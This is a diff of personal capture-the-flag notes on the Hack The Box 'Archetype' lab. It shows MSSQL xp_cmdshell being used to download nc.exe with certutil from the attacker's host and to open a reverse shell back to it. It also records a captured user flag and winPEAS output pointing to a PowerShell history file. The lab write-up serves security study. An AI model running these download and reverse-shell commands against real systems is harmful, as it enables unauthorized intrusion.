@@ -1,6 +1,7 @@
 # Archetype
 > Remote: 10.129.58.39
 > Remote: 10.129.46.106  (reset)
+> Remote: 10.129.95.187  (reset)
 
 > Local:  10.10.15.104
 ---
@@ -207,14 +208,68 @@ What script can be used in order to search possible paths to escalate privileges
 certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEAS.bat
 certutil -urlcache -f http://[target_ip]:[port]/winPEAS.bat C:\tmp\winPEASany.exe
 ```
-5. Run winPEAS. Example: `c:\tmp\winPEAS.bat`
+4. Run winPEAS. Example: `c:\tmp\winPEAS.bat`
 
 Command I ran in this HTB: 
 ```
 SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell c:\tmp\winPEAS.bat
 ```
 
+**Results:**( Massive amount of output (wait for it...)
+- Didn't help much at all
+
+---
+
+## Walk-Through
+- From the point where you can execute cmd commands via the SQL prompt (example: `xp_cmdshell whoami`).
+
+## nc64.exe Reverse Shell
+- Upload nc64.exe from attack machine to target machine and set up a reverse shell.
+- I copied over the nc.exe file from Kali's /user/share and then spun up a python http.server.
+- Then on the target...
+```
+xp_cmdshell certutil -urlcache -f http://10.10.15.104:80/nc.exe c:\tmp\nc.exe
+```
+- Then set up a listener on the local attack machine. On the target: 
+```
+xp_cmdshell c:\tmp\nc.exe 10.10.15.104 1234
+```
+
+## Flags
+
+1. The user flag is on the user's Desktop (which I thought I checked via SQL).
+```
+C:\Users\sql_svc\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\sql_svc\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,272,993,280 bytes free
+
+C:\Users\sql_svc\Desktop>type user.txt
+type user.txt
+3e7b102e78218e935bf3f4951fec21a3
+```
+
+2. For the Admin flag, you have to PrivEsc to get into his subdir.
+- This is where winPEAS comes into play (download it from the repo, upload it to the target, etc.).
+- Here is the important part of the output I got when I ran itÑ
+```
+Checking PS history file
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+NULL
+ Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+NULL
+03/17/2020  02:36 AM                79 ConsoleHost_history.txt
+               1 File(s)             79 bytes
+               0 Dir(s)  10,403,086,336 bytes free
+```
 
 
-
-- 
